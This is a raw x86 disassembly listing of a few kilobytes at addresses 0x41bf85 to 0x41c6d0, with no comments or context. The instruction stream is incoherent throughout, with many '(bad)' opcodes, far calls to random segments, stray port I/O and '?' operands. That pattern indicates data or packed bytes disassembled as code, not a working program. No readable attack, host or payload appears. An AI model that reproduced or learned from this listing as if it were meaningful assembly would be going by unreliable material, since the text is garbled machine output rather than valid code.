  41bf85:	xchg   edi,eax
  41bf86:	mov    BYTE PTR [ebx+0x71],0x2e
  41bf8a:	test   DWORD PTR [ecx],0x22bd32c
  41bf90:	mov    edi,?
  41bf92:	sub    eax,edi
  41bf94:	xchg   edx,eax
  41bf95:	or     DWORD PTR [ecx],ecx
  41bf97:	xlat   BYTE PTR ds:[ebx]
  41bf98:	es call 0xffb8:0x157228c2
  41bfa0:	lock push ebp
  41bfa2:	cmc    
  41bfa3:	ss pop eax
  41bfa5:	jns    0x41bf5f
  41bfa7:	in     al,0x10
  41bfa9:	fld    QWORD PTR [ebx+edx*4+0x24895064]
  41bfb0:	sbb    BYTE PTR [edx+esi*2-0x72],dl
  41bfb4:	lock adc eax,0xa3bca293
  41bfba:	cmp    eax,0x16161dd4
  41bfbf:	nop    DWORD PTR [edx+0x3b42f3ea]
  41bfc6:	mov    ah,0x44
  41bfc8:	ss popf 
  41bfca:	ror    DWORD PTR [eax],1
  41bfcc:	mov    WORD PTR [ebx],fs
  41bfce:	push   cs
  41bfcf:	rol    DWORD PTR [esi],cl
  41bfd1:	imul   DWORD PTR [eax-0x67772d63]
  41bfd7:	pop    es
  41bfd8:	je     0x41c048
  41bfda:	xor    bl,BYTE PTR [eax]
  41bfdc:	pop    edi
  41bfdd:	das    
  41bfde:	adc    eax,0x8a01ae4f
  41bfe3:	iret   
  41bfe4:	sbb    al,0xd3
  41bfe6:	call   0x5048:0x5a574e64
  41bfed:	inc    esi
  41bfee:	mov    eax,0x2245c716
  41bff3:	sbb    eax,0xa03c2976
  41bff8:	push   esi
  41bff9:	push   ss
  41bffa:	jp     0x41c03d
  41bffc:	jmp    0x93be:0x9bf26d1a
  41c003:	sub    al,0x59
  41c005:	iret   
  41c006:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c007:	mov    ds:0x5ea0753d,al
  41c00c:	cli    
  41c00d:	pop    ebx
  41c00e:	test   eax,0x4047ac49
  41c013:	mov    ebp,0xf9178f9d
  41c018:	mov    esi,0x62cdc4f6
  41c01d:	hlt    
  41c01e:	fs (bad) 
  41c020:	cld    
  41c021:	xlat   BYTE PTR ds:[ebx]
  41c022:	ficomp WORD PTR [ebp-0x7c]
  41c025:	bound  ebx,QWORD PTR [ecx+0x1c4b2feb]
  41c02b:	push   ss
  41c02c:	in     al,dx
  41c02d:	push   eax
  41c02e:	jmp    0x13877b80
  41c033:	dec    eax
  41c034:	(bad)  
  41c036:	adc    DWORD PTR [ecx-0x640e2604],ebx
  41c03c:	sbb    BYTE PTR [edi-0x38],bh
  41c03f:	sbb    BYTE PTR [edi-0x6e8f4905],0x12
  41c046:	mov    eax,ds:0x5c0e1d81
  41c04b:	xchg   ecx,eax
  41c04c:	cli    
  41c04d:	fbstp  TBYTE PTR [edi-0x1cafefb7]
  41c053:	test   eax,0x21569243
  41c059:	xchg   ecx,eax
  41c05a:	in     al,0xb
  41c05c:	aam    0xc2
  41c05e:	cmp    eax,0x9af98faf
  41c063:	pop    ds
  41c064:	std    
  41c065:	int    0x71
  41c067:	pushf  
  41c068:	stc    
  41c069:	scas   al,BYTE PTR es:[edi]
  41c06a:	pop    ebp
  41c06b:	push   edi
  41c06c:	add    cl,BYTE PTR [edx]
  41c06e:	das    
  41c06f:	xchg   ebp,eax
  41c070:	push   ebx
  41c071:	sbb    BYTE PTR [edi+0x4f4e630a],cl
  41c077:	and    al,cl
  41c079:	add    DWORD PTR [ecx+0x52],edx
  41c07c:	icebp  
  41c07d:	add    DWORD PTR [edx-0x5f9be065],ebx
  41c083:	sub    dl,BYTE PTR ds:0xc479e735
  41c089:	lock lea ebx,[eax-0x1a7cebb6]
  41c090:	aad    0x46
  41c092:	xor    edx,DWORD PTR [ebp+0x469db885]
  41c098:	jb     0x41c037
  41c09a:	(bad)  
  41c09b:	xchg   ebp,eax
  41c09c:	push   cs
  41c09d:	jne    0x41c102
  41c09f:	jb     0x41c0cc
  41c0a1:	and    eax,0x55c7f379
  41c0a6:	imul   ecx,DWORD PTR cs:[eax+0x1221a7a1],0x85e7216c
  41c0b1:	stos   DWORD PTR es:[edi],eax
  41c0b2:	jge    0x41c0cb
  41c0b4:	icebp  
  41c0b5:	lods   eax,DWORD PTR ds:[esi]
  41c0b6:	xchg   ebp,eax
  41c0b7:	pop    ss
  41c0b8:	dec    ecx
  41c0b9:	addr16 gs (bad) 
  41c0bc:	cli    
  41c0bd:	rcl    BYTE PTR [ebp+ebx*8+0x3c],cl
  41c0c1:	retf   
  41c0c2:	add    dh,BYTE PTR [esi+eax*4+0x2616b785]
  41c0c9:	fs pop ss
  41c0cb:	loopne 0x41c138
  41c0cd:	mov    ecx,0x4c75c59c
  41c0d2:	push   0xfffffff5
  41c0d4:	push   eax
  41c0d5:	je     0x41c119
  41c0d7:	xchg   edi,eax
  41c0d8:	icebp  
  41c0d9:	and    BYTE PTR [edx-0x6],ch
  41c0dc:	pop    esp
  41c0dd:	and    ecx,ecx
  41c0df:	adc    BYTE PTR [edi-0x7c],dh
  41c0e2:	jmp    0x41c0a3
  41c0e4:	or     al,cl
  41c0e6:	(bad)  [ebp-0x27551077]
  41c0ec:	inc    esp
  41c0ed:	sbb    esp,ebx
  41c0ef:	pop    edi
  41c0f0:	in     eax,0x98
  41c0f2:	out    0x26,eax
  41c0f4:	xor    al,0x11
  41c0f6:	dec    esi
  41c0f7:	push   ebp
  41c0f8:	shr    BYTE PTR [ebp-0x5db38bb0],0xdb
  41c0ff:	cli    
  41c100:	cdq    
  41c101:	and    ebx,DWORD PTR [eax]
  41c103:	pop    edi
  41c104:	cmp    cl,BYTE PTR [ecx-0x6e]
  41c107:	retf   0x80c5
  41c10a:	je     0x41c0af
  41c10c:	shr    dh,cl
  41c10e:	add    BYTE PTR [edx+0x18],dh
  41c111:	mov    ebp,0xa7237e08
  41c116:	pop    ss
  41c117:	sbb    ebx,DWORD PTR [edi]
  41c119:	mov    al,0xec
  41c11b:	xor    DWORD PTR [ebp+edi*2+0x5e],esi
  41c11f:	in     eax,0x43
  41c121:	scas   eax,DWORD PTR es:[edi]
  41c122:	lds    ebx,FWORD PTR [esi-0x5d]
  41c125:	jp     0x41c139
  41c127:	push   ebp
  41c128:	(bad)  
  41c129:	push   edi
  41c12a:	pop    ss
  41c12b:	mov    DWORD PTR [esi],esi
  41c12d:	sbb    eax,0xb10aa43b
  41c132:	leave  
  41c133:	mov    dh,0x12
  41c135:	add    ah,BYTE PTR [ecx-0x20b1837f]
  41c13b:	(bad)  
  41c13c:	jl     0x41c17b
  41c13e:	mov    eax,ds:0xea8cafac
  41c143:	mov    dh,0x8
  41c145:	div    edi
  41c147:	cs das 
  41c149:	test   DWORD PTR [esi+ebx*2+0x37],edx
  41c14d:	sbb    BYTE PTR [ebx],0x6d
  41c150:	sbb    esi,DWORD PTR [ecx-0x6b]
  41c153:	fild   WORD PTR [ebp-0x16]
  41c156:	in     eax,0x6c
  41c158:	pop    esp
  41c159:	js     0x41c160
  41c15b:	mov    ah,0xcd
  41c15d:	inc    edi
  41c15e:	in     eax,dx
  41c15f:	aaa    
  41c160:	or     DWORD PTR [ecx],esi
  41c162:	ret    
  41c163:	in     al,0xa7
  41c165:	addr16 cmp al,0x77
  41c168:	rol    dh,0xc
  41c16b:	jb     0x41c10c
  41c16d:	aam    0x1c
  41c16f:	push   ds
  41c170:	cmp    BYTE PTR [ebx-0x25],bh
  41c173:	out    0x7a,al
  41c175:	pusha  
  41c176:	jae    0x41c1ec
  41c178:	xor    DWORD PTR [edx-0x73],edi
  41c17b:	imul   ebx,DWORD PTR [edx+0x5a],0xffffffb8
  41c17f:	jl     0x41c16b
  41c181:	pop    edx
  41c182:	fld    DWORD PTR [edx]
  41c184:	out    0xca,eax
  41c186:	enter  0xf82,0xd7
  41c18a:	fidiv  DWORD PTR [eax-0x773a4b21]
  41c190:	in     al,dx
  41c191:	rcl    DWORD PTR [eax+0x505d5d60],0x7c
  41c198:	push   cs
  41c199:	pop    edi
  41c19a:	lock jl 0x41c213
  41c19d:	rcl    dh,0x51
  41c1a0:	pop    es
  41c1a1:	jb     0x41c184
  41c1a3:	aad    0xa7
  41c1a5:	jbe    0x41c149
  41c1a7:	sub    al,bh
  41c1a9:	jle    0x41c130
  41c1ab:	inc    edi
  41c1ac:	and    BYTE PTR [ebp+0x54],bh
  41c1af:	shl    BYTE PTR [edx+0x3b],1
  41c1b2:	and    eax,0xe6885b98
  41c1b7:	or     DWORD PTR [ebp+0x4b],ebx
  41c1ba:	pop    eax
  41c1bb:	sub    esi,DWORD PTR [ebx]
  41c1bd:	xchg   ecx,eax
  41c1be:	inc    ebx
  41c1bf:	ror    dl,0xaa
  41c1c2:	mov    eax,ds:0x7aad1060
  41c1c7:	out    0xb,eax
  41c1c9:	ins    DWORD PTR es:[edi],dx
  41c1ca:	mov    dh,0x48
  41c1cc:	data16 int 0xae
  41c1cf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c1d0:	lods   eax,DWORD PTR ds:[esi]
  41c1d1:	pop    ebp
  41c1d2:	stos   DWORD PTR es:[edi],eax
  41c1d3:	xor    edi,DWORD PTR [eax-0x7a]
  41c1d6:	cld    
  41c1d7:	xlat   BYTE PTR ds:[ebx]
  41c1d8:	loopne 0x41c219
  41c1da:	mov    edi,0xb908050
  41c1df:	jp     0x41c227
  41c1e1:	cmp    ch,BYTE PTR [esi-0x3]
  41c1e4:	sbb    eax,0x524af0b7
  41c1e9:	inc    esp
  41c1ea:	sbb    al,0xcd
  41c1ec:	in     al,0xcd
  41c1ee:	and    BYTE PTR [edx+0x3f],dl
  41c1f1:	inc    ebx
  41c1f2:	or     DWORD PTR [eax],edi
  41c1f4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c1f5:	ret    
  41c1f6:	push   esi
  41c1f7:	or     BYTE PTR [ebx+0x6d],ch
  41c1fa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c1fb:	repnz icebp 
  41c1fd:	or     eax,0x59127502
  41c202:	or     eax,0x50321679
  41c207:	fdivrp st(4),st
  41c209:	test   eax,0xf4eca81d
  41c20e:	arpl   WORD PTR [edi-0x68],ax
  41c211:	add    ecx,0x2
  41c214:	test   eax,0x4f64d5b9
  41c219:	or     al,0xae
  41c21b:	dec    esi
  41c21c:	mov    dh,0x1
  41c21e:	cld    
  41c21f:	lods   eax,DWORD PTR ds:[esi]
  41c220:	xchg   edi,eax
  41c221:	sar    BYTE PTR [eax],1
  41c223:	lds    esi,FWORD PTR [ebx]
  41c225:	nop
  41c226:	pop    eax
  41c227:	scas   al,BYTE PTR es:[edi]
  41c228:	mov    al,0x91
  41c22a:	and    eax,0xc91a371d
  41c22f:	test   al,0x5a
  41c231:	int3   
  41c232:	outs   dx,BYTE PTR ds:[esi]
  41c233:	outs   dx,DWORD PTR ds:[esi]
  41c234:	in     eax,dx
  41c235:	inc    esp
  41c236:	in     al,dx
  41c237:	pop    eax
  41c238:	fidiv  WORD PTR [edi-0x6c]
  41c23b:	ficom  WORD PTR [ebx+0x1e314978]
  41c241:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c242:	ins    BYTE PTR es:[edi],dx
  41c243:	repnz sbb dh,BYTE PTR [esi]
  41c246:	(bad)  
  41c247:	and    edi,ebp
  41c249:	(bad)  
  41c24a:	fld    QWORD PTR [ecx]
  41c24c:	adc    al,0xa5
  41c24e:	data16 hlt 
  41c250:	jmp    0xf072:0x9da3b22
  41c257:	shl    DWORD PTR [ebx],cl
  41c259:	aam    0xd5
  41c25b:	iret   
  41c25c:	xchg   DWORD PTR [ecx+0x43],edi
  41c25f:	xchg   esp,eax
  41c260:	mov    esp,0xb9d3d22b
  41c265:	fidivr DWORD PTR [esi-0x60]
  41c268:	loope  0x41c22c
  41c26a:	fucom  st(1)
  41c26c:	add    al,bl
  41c26e:	mov    cl,0x2e
  41c270:	test   bl,cl
  41c272:	xor    ah,al
  41c274:	icebp  
  41c275:	retf   0xb96d
  41c278:	cmc    
  41c279:	retf   0x13d
  41c27c:	or     ah,dl
  41c27e:	pop    ebp
  41c27f:	(bad)  
  41c280:	fidivr DWORD PTR [esi+0x7]
  41c283:	push   esi
  41c284:	adc    DWORD PTR [edx+0x27],ebx
  41c287:	cli    
  41c288:	jg     0x41c263
  41c28a:	fistp  DWORD PTR [ebx-0x37]
  41c28d:	pop    ds
  41c28e:	(bad)  
  41c28f:	ins    BYTE PTR es:[edi],dx
  41c290:	(bad)  
  41c291:	cmp    ch,bh
  41c293:	cmp    eax,0x94754012
  41c298:	mov    esp,0x42ca5a69
  41c29d:	jg     0x41c304
  41c29f:	jnp    0x41c292
  41c2a1:	xchg   esi,eax
  41c2a2:	rcr    DWORD PTR [ebx],cl
  41c2a4:	jp     0x41c30a
  41c2a6:	dec    esp
  41c2a7:	mov    ds:0xac54da65,al
  41c2ac:	shl    BYTE PTR [ebx],0x9e
  41c2af:	dec    ecx
  41c2b0:	pop    edi
  41c2b1:	mov    esi,DWORD PTR [esi+0x20dcf0b4]
  41c2b7:	cdq    
  41c2b8:	adc    eax,0x28b67283
  41c2bd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c2be:	ins    DWORD PTR es:[edi],dx
  41c2bf:	addr16 aas 
  41c2c1:	shl    BYTE PTR [ebx+0x77],cl
  41c2c4:	cli    
  41c2c5:	xchg   edx,eax
  41c2c6:	pop    esi
  41c2c7:	fisub  DWORD PTR [ebp+0x4a]
  41c2ca:	or     eax,0xdb9cc319
  41c2cf:	jno    0x41c269
  41c2d1:	dec    edi
  41c2d2:	or     al,0xf4
  41c2d4:	pushf  
  41c2d5:	ja     0x41c352
  41c2d7:	mov    bl,0x4
  41c2d9:	inc    edx
  41c2da:	dec    edi
  41c2db:	imul   edx,DWORD PTR [edx-0x533af900],0xffffffaf
  41c2e2:	pop    esi
  41c2e4:	mov    dh,0xe8
  41c2e6:	adc    eax,0xaa5bebb8
  41c2eb:	jmp    0x41c2b6
  41c2ed:	sbb    ebp,0xadb93938
  41c2f3:	jns    0x41c2cd
  41c2f5:	jp     0x41c34a
  41c2f7:	out    dx,al
  41c2f8:	xchg   esi,eax
  41c2f9:	(bad)  
  41c2fa:	push   0xa462f13
  41c2ff:	push   esp
  41c300:	or     dh,cl
  41c302:	inc    ecx
  41c303:	fistp  QWORD PTR [ecx+ebx*4]
  41c306:	(bad)  
  41c308:	adc    al,0x18
  41c30a:	or     eax,0x82ae48f8
  41c30f:	iret   
  41c310:	pop    ebp
  41c311:	mov    dl,0x66
  41c313:	or     eax,0xf57b8111
  41c318:	xor    esp,DWORD PTR [esi-0x23]
  41c31b:	sub    BYTE PTR [edi+0x4dc56cfa],ah
  41c321:	mov    ah,0x9a
  41c323:	cs adc al,0x4d
  41c326:	outs   dx,BYTE PTR ds:[esi]
  41c327:	fsubr  QWORD PTR [esi-0x48]
  41c32a:	into   
  41c32b:	rep ins DWORD PTR es:[edi],dx
  41c32d:	and    al,0x21
  41c32f:	and    BYTE PTR [ebx-0x5439e09d],bh
  41c335:	fldenv [edi+0x58]
  41c338:	xchg   ecx,eax
  41c339:	xor    esp,ebx
  41c33b:	lods   al,BYTE PTR ds:[esi]
  41c33c:	ja     0x41c386
  41c33e:	call   0x4ef097af
  41c343:	lea    ecx,[esi-0xa3fb719]
  41c349:	ret    0x9cf8
  41c34c:	mul    DWORD PTR [ebp+0x6c]
  41c34f:	pop    ss
  41c350:	xor    DWORD PTR [ebp-0x541e0f9f],edx
  41c356:	fist   WORD PTR [edx-0x7cbe10c7]
  41c35c:	ss sbb al,0xd2
  41c35f:	sub    BYTE PTR [edx+0x7f280b9d],ah
  41c365:	jns    0x41c3b9
  41c367:	pop    ebx
  41c368:	xlat   BYTE PTR ds:[ebx]
  41c369:	jg     0x41c331
  41c36b:	ins    BYTE PTR es:[edi],dx
  41c36c:	loope  0x41c38e
  41c36e:	cwde   
  41c36f:	arpl   bx,dx
  41c371:	mov    dl,0x8d
  41c373:	xchg   ebp,eax
  41c374:	loopne 0x41c3a2
  41c376:	pop    ebp
  41c377:	xchg   ebx,eax
  41c378:	xlat   BYTE PTR ds:[ebx]
  41c379:	add    BYTE PTR [ecx-0xf],dl
  41c37c:	out    dx,al
  41c37d:	sbb    esp,DWORD PTR [esi+0x5e800dd1]
  41c383:	repnz lea edi,es:[eax+0x55]
  41c388:	lods   al,BYTE PTR ds:[esi]
  41c389:	or     ch,BYTE PTR [edx]
  41c38b:	mov    WORD PTR [ebx],?
  41c38d:	popf   
  41c38e:	sbb    ecx,DWORD PTR [ebx+0x3]
  41c391:	aaa    
  41c392:	push   ebx
  41c393:	pop    es
  41c394:	mov    esp,0x4ed3af2b
  41c399:	bound  eax,QWORD PTR ds:0x15dc2577
  41c39f:	fcomp  st(0)
  41c3a1:	test   al,0xe8
  41c3a3:	and    eax,0x9610c690
  41c3a8:	mov    ecx,0x70be3f40
  41c3ad:	xchg   esi,eax
  41c3ae:	sbb    ah,bh
  41c3b0:	clc    
  41c3b1:	stos   BYTE PTR es:[edi],al
  41c3b2:	inc    edx
  41c3b3:	adc    dl,al
  41c3b5:	je     0x41c385
  41c3b7:	icebp  
  41c3b8:	dec    edx
  41c3b9:	cmp    BYTE PTR [ebx-0x6dd2f4],cl
  41c3bf:	nop
  41c3c0:	and    eax,0x215e00f0
  41c3c5:	test   BYTE PTR [edi],ch
  41c3c7:	aas    
  41c3c8:	jmp    0x9c53:0xc7d64325
  41c3cf:	mov    ch,0xe2
  41c3d1:	push   edi
  41c3d2:	mov    ebx,0xe1ad2ee4
  41c3d7:	xchg   esp,eax
  41c3d8:	xchg   ebx,eax
  41c3d9:	clc    
  41c3da:	pop    ebx
  41c3db:	inc    ecx
  41c3dc:	repz cmp dh,BYTE PTR [ecx+0x3]
  41c3e0:	jge    0x41c37a
  41c3e2:	fld    QWORD PTR [ebp-0x6f79ac5]
  41c3e8:	(bad)  
  41c3e9:	ins    BYTE PTR es:[edi],dx
  41c3ea:	xchg   esi,eax
  41c3eb:	(bad)  
  41c3ec:	aam    0x84
  41c3ee:	les    ebp,FWORD PTR [ebx-0x11d8f8af]
  41c3f4:	adc    eax,0x445309dc
  41c3f9:	xor    ebp,DWORD PTR [eax]
  41c3fb:	jge    0x41c3de
  41c3fd:	mov    dh,0x4e
  41c3ff:	outs   dx,DWORD PTR ds:[esi]
  41c400:	add    esp,DWORD PTR [ebx]
  41c402:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c403:	dec    eax
  41c404:	ret    0xc392
  41c407:	pop    ebx
  41c408:	dec    esp
  41c409:	outs   dx,BYTE PTR ds:[esi]
  41c40a:	cmp    cl,dh
  41c40c:	int    0x1b
  41c40e:	mov    bl,0xc8
  41c410:	int    0x4c
  41c412:	or     DWORD PTR [ebx-0x41],0xfab8b9bf
  41c419:	pusha  
  41c41a:	ins    DWORD PTR es:[edi],dx
  41c41b:	jo     0x41c3fd
  41c41d:	loopne 0x41c474
  41c41f:	(bad)  
  41c420:	sahf   
  41c421:	aam    0x34
  41c423:	rol    bh,cl
  41c425:	cmc    
  41c426:	loope  0x41c3da
  41c428:	test   DWORD PTR [esi+0x1a],eax
  41c42b:	test   al,0x7c
  41c42d:	bt     DWORD PTR [edx+0x3e6cd313],ebx
  41c434:	fbstp  TBYTE PTR [eax]
  41c436:	add    al,0xbf
  41c438:	add    eax,0xb6e74404
  41c43d:	cmp    eax,0xb650b895
  41c442:	inc    ecx
  41c443:	inc    esp
  41c444:	mov    WORD PTR [edi-0x7b],?
  41c447:	jecxz  0x41c417
  41c449:	mov    edx,0xc65fad7a
  41c44e:	out    0xb8,al
  41c450:	cmc    
  41c451:	mov    DWORD PTR [ebx-0x333a909c],esp
  41c457:	sbb    al,0x56
  41c459:	shl    edi,cl
  41c45b:	stos   DWORD PTR es:[edi],eax
  41c45c:	pusha  
  41c45d:	inc    eax
  41c45e:	cmp    esp,DWORD PTR [esi+0xc]
  41c461:	push   eax
  41c462:	int3   
  41c463:	mov    esp,0x56ebc359
  41c468:	icebp  
  41c469:	ins    BYTE PTR es:[edi],dx
  41c46a:	inc    ecx
  41c46b:	mov    eax,0x4528fdc2
  41c470:	pop    es
  41c471:	dec    esi
  41c472:	mov    bl,0xd2
  41c474:	mov    ds:0x84df4c73,al
  41c479:	inc    ebx
  41c47a:	ins    BYTE PTR es:[edi],dx
  41c47b:	lock xchg edi,eax
  41c47d:	dec    edi
  41c47e:	aas    
  41c47f:	(bad)  
  41c480:	out    dx,al
  41c481:	jg     0x9048e02e
  41c487:	outs   dx,DWORD PTR ds:[esi]
  41c488:	data16 jl 0x41c4ad
  41c48b:	sub    eax,0x29419324
  41c490:	adc    eax,DWORD PTR [edx+0x7f]
  41c493:	test   BYTE PTR [ecx],bl
  41c495:	inc    esp
  41c496:	mov    BYTE PTR [ecx+ecx*2],dh
  41c499:	int3   
  41c49a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c49b:	(bad)  
  41c49c:	jmp    0x69e59929
  41c4a1:	xchg   ebp,eax
  41c4a2:	or     BYTE PTR [ecx],al
  41c4a4:	clc    
  41c4a5:	(bad)  
  41c4a6:	aas    
  41c4a7:	repz imul edi,DWORD PTR [ebx+0x11f7876e],0xffffffaf
  41c4af:	int    0x78
  41c4b1:	and    eax,0x9085dccd
  41c4b6:	sub    ch,cl
  41c4b8:	and    DWORD PTR [edx+0x1e],esp
  41c4bb:	jne    0x41c459
  41c4bd:	jo     0x41c4ff
  41c4bf:	jl     0x41c441
  41c4c1:	add    BYTE PTR [edi-0x36],0x48
  41c4c5:	dec    esp
  41c4c6:	mov    bh,0x4f
  41c4c8:	lea    ebp,[edx+0x7d77b69e]
  41c4ce:	loope  0x41c47c
  41c4d0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c4d1:	pop    es
  41c4d2:	ins    BYTE PTR es:[edi],dx
  41c4d3:	push   ecx
  41c4d4:	stos   BYTE PTR es:[edi],al
  41c4d5:	mov    edx,cs
  41c4d7:	lods   al,BYTE PTR ds:[esi]
  41c4d8:	div    BYTE PTR [esi]
  41c4da:	cmp    BYTE PTR [esi-0x26],al
  41c4dd:	jg     0x41c488
  41c4df:	lds    esi,FWORD PTR [ebx-0x2e3a89ee]
  41c4e5:	jae    0x41c4f1
  41c4e7:	shr    edi,1
  41c4e9:	outs   dx,DWORD PTR ds:[esi]
  41c4ea:	push   ebp
  41c4eb:	retf   0x35b6
  41c4ee:	popa   
  41c4ef:	push   0x47
  41c4f1:	pop    ss
  41c4f2:	cmp    BYTE PTR [ebp+ebp*2+0x29e483ba],al
  41c4f9:	pushf  
  41c4fa:	sbb    dh,BYTE PTR [edx-0x498df5b0]
  41c500:	sbb    cl,BYTE PTR [ecx]
  41c502:	jnp    0x41c51a
  41c504:	adc    eax,0x50feb040
  41c509:	xchg   ebx,eax
  41c50a:	xchg   DWORD PTR [eax+ebx*2],ebx
  41c50d:	mov    edx,0xfc8651f3
  41c512:	push   ebp
  41c513:	idiv   ecx
  41c515:	push   edx
  41c516:	sub    BYTE PTR [esi-0x6c6e6bd0],ah
  41c51c:	imul   edx,DWORD PTR [esi-0x638ca6f],0x6e
  41c523:	cmp    dl,BYTE PTR [ebp+0x30]
  41c526:	ins    BYTE PTR es:[edi],dx
  41c527:	(bad)  
  41c528:	jns    0x41c5a6
  41c52a:	and    BYTE PTR [edi],dl
  41c52c:	sub    DWORD PTR [ecx+0x16b16819],esi
  41c532:	mov    cl,0x57
  41c534:	ins    DWORD PTR es:[edi],dx
  41c535:	mov    ch,BYTE PTR [edi-0x7f079706]
  41c53b:	sbb    bh,BYTE PTR [eax+0x219fc826]
  41c541:	pop    ecx
  41c542:	sbb    bl,BYTE PTR [ebx+0x7dee5c7b]
  41c548:	sub    DWORD PTR [ecx+0x20bacfb6],ebx
  41c54e:	das    
  41c54f:	pop    ebx
  41c550:	popa   
  41c551:	mov    ecx,0xe2e81346
  41c556:	test   al,0xdc
  41c558:	or     dl,bl
  41c55a:	mov    cl,0x1c
  41c55c:	fs push ds
  41c55e:	rcl    DWORD PTR [edi+0x1742f24b],cl
  41c564:	cmp    al,0x8f
  41c566:	div    DWORD PTR [eax-0x767859c1]
  41c56c:	sub    al,0xf6
  41c56e:	sbb    BYTE PTR [ebx+0x43],ah
  41c571:	adc    dl,dh
  41c573:	sbb    dl,BYTE PTR [edx]
  41c575:	inc    edi
  41c576:	push   ebp
  41c577:	and    ecx,DWORD PTR gs:[eax]
  41c57a:	ret    0x84f9
  41c57d:	dec    eax
  41c57e:	test   eax,0x8d2abb7
  41c583:	je     0x41c5ed
  41c585:	sbb    al,0xca
  41c587:	dec    esp
  41c588:	cmp    DWORD PTR [eax+edx*4+0x73b2ef5b],esi
  41c58f:	hlt    
  41c590:	sub    al,0xc4
  41c592:	adc    al,0x22
  41c594:	xor    edi,esi
  41c596:	cwde   
  41c597:	or     eax,0xbb0be0e7
  41c59c:	mov    ebx,DWORD PTR [ecx+ebx*1]
  41c59f:	sub    al,0x2f
  41c5a1:	xor    bl,BYTE PTR [edi*2-0x612d4f27]
  41c5a8:	fs arpl di,sp
  41c5ab:	sub    cl,BYTE PTR [eax]
  41c5ad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c5ae:	mov    ah,0x6a
  41c5b0:	arpl   cx,sp
  41c5b2:	cmp    eax,0xa6670537
  41c5b7:	fdivp  st(4),st
  41c5b9:	xlat   BYTE PTR ds:[ebx]
  41c5ba:	inc    edx
  41c5bb:	cld    
  41c5bc:	cmp    DWORD PTR [edi+0x37730],0x71
  41c5c3:	jo     0x41c572
  41c5c5:	ror    esi,1
  41c5c7:	das    
  41c5c8:	gs pop ds
  41c5ca:	test   eax,0x65ba890a
  41c5cf:	mov    ds:0x397f769b,al
  41c5d4:	sbb    al,0x32
  41c5d6:	adc    esp,DWORD PTR [ebx]
  41c5d8:	aas    
  41c5d9:	cmp    dl,BYTE PTR [ecx+0xa]
  41c5dc:	and    DWORD PTR [ebp+0x5340fb97],0xffffff9c
  41c5e3:	in     al,dx
  41c5e4:	repz xchg edi,eax
  41c5e6:	cmp    BYTE PTR [edx+0x47],bh
  41c5e9:	popa   
  41c5ea:	test   ebx,eax
  41c5ec:	sbb    ebp,DWORD PTR [edx+0x4554896c]
  41c5f2:	add    cl,BYTE PTR [ecx+0x75dfa96d]
  41c5f8:	int    0xfa
  41c5fa:	shr    BYTE PTR [edx-0x3e],0xb5
  41c5fe:	fidivr DWORD PTR [edx]
  41c600:	dec    ecx
  41c601:	sub    dh,ch
  41c603:	stos   DWORD PTR es:[edi],eax
  41c604:	mov    ds:0x7e9db0d0,eax
  41c609:	jle    0x41c651
  41c60b:	mov    eax,edx
  41c60d:	arpl   WORD PTR [ecx],cx
  41c60f:	mov    ds,WORD PTR [ecx]
  41c611:	clc    
  41c612:	sub    esi,DWORD PTR [esi-0x222fe3fb]
  41c618:	add    eax,0x2d68869d
  41c61d:	div    ebx
  41c61f:	mov    cl,0x37
  41c621:	pop    edi
  41c622:	ins    BYTE PTR es:[edi],dx
  41c623:	popf   
  41c624:	shl    DWORD PTR [esi],cl
  41c626:	and    dl,BYTE PTR [esi]
  41c628:	ss adc bh,dl
  41c62b:	pusha  
  41c62c:	iret   
  41c62d:	mov    eax,DWORD PTR [edi+edi*2]
  41c630:	mov    cl,0x4a
  41c632:	cmp    eax,0xb73baba0
  41c637:	push   eax
  41c638:	cwde   
  41c639:	arpl   WORD PTR [ecx+ebp*8],ax
  41c63c:	or     bh,BYTE PTR [ebp-0x64]
  41c63f:	int3   
  41c640:	sahf   
  41c641:	inc    eax
  41c642:	cli    
  41c643:	adc    bl,0x2c
  41c646:	test   ebp,edx
  41c648:	sbb    eax,0x7abec82a
  41c64d:	jle    0x41c5f6
  41c64f:	push   ecx
  41c650:	call   0xf27f:0xd89541d8
  41c657:	imul   ebp,esp,0xffffffe3
  41c65a:	test   ah,bl
  41c65c:	cmp    DWORD PTR [ecx-0x3c7029cf],ebp
  41c662:	inc    ecx
  41c663:	cld    
  41c664:	jns    0x41c5eb
  41c666:	and    cl,al
  41c668:	sub    BYTE PTR [ebp+0x3a],dl
  41c66b:	pop    ecx
  41c66c:	adc    al,0x58
  41c66e:	cdq    
  41c66f:	sbb    edi,edi
  41c671:	and    al,0xfa
  41c673:	call   0x4da5:0xcb61b5a7
  41c67a:	mov    esp,0x93750326
  41c67f:	push   edi
  41c680:	into   
  41c681:	js     0x41c6f8
  41c683:	and    eax,0xbdbdeaa6
  41c688:	mov    ds:0xde083d95,al
  41c68d:	pop    ebp
  41c68e:	mov    dh,ch
  41c690:	imul   eax,DWORD PTR [edi-0x2d],0x43
  41c694:	mov    cl,BYTE PTR [esi+esi*2+0x3c77e04d]
  41c69b:	inc    eax
  41c69c:	push   0xd121b4ec
  41c6a1:	sbb    bh,BYTE PTR [edi-0x6b338c25]
  41c6a7:	push   ss
  41c6a8:	mov    dh,0x52
  41c6aa:	jo     0x41c6e3
  41c6ac:	lods   al,BYTE PTR ds:[esi]
  41c6ad:	sbb    dh,dl
  41c6af:	push   cs
  41c6b0:	sub    ch,ah
  41c6b2:	iret   
  41c6b3:	mov    esp,0x86cf715c
  41c6b8:	add    edi,DWORD PTR [edi+0x77236b50]
  41c6be:	ror    BYTE PTR [eax+0x3411c4fa],cl
  41c6c4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c6c5:	ins    BYTE PTR es:[edi],dx
  41c6c6:	mov    esp,0xacece8ee
  41c6cb:	dec    ecx
  41c6cc:	mov    bl,ch
  41c6ce:	push   ecx
  41c6cf:	xchg   ebp,eax
  41c6d0:	adc    cl,BYTE PTR [ebp-0x2a]
